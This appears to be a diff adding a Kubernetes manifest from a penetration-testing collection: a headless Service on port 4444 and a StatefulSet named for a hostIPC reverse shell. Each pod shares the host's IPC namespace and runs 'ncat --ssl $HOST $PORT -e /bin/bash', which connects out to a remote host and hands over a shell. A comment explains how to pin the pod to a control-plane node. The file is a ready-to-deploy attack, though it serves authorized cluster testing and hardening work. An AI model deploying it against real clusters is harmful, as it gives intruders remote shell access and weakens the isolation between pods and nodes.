@@ -1,0 +1,43 @@
+apiVersion: v1
+kind: Service
+metadata:
+  name: hostipc-revshell-statefulset-service
+  labels:
+    app: pentest
+spec:
+  ports:
+  - port: 4444
+    name: hostipc-revshell-statefulset-service
+  clusterIP: None
+  selector:
+    app: pentest
+---
+apiVersion: apps/v1
+kind: StatefulSet
+metadata:
+  name: hostipc-revshell-statefulset
+  labels:
+    app: pentest
+    type: statefulset
+spec:
+  serviceName: "pentest"
+  replicas: 2
+  selector:
+    matchLabels:
+      app: pentest
+      type: statefulset
+  template:
+    metadata:
+      labels:
+        app: pentest
+        type: statefulset
+    spec:
+      hostIPC: true
+      containers:
+      - name: hostipc
+        image: raesene/ncat
+        command: [ "/bin/sh", "-c", "--" ]
+        args: [ "ncat --ssl $HOST $PORT -e /bin/bash;" ]
+      #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
+
+      
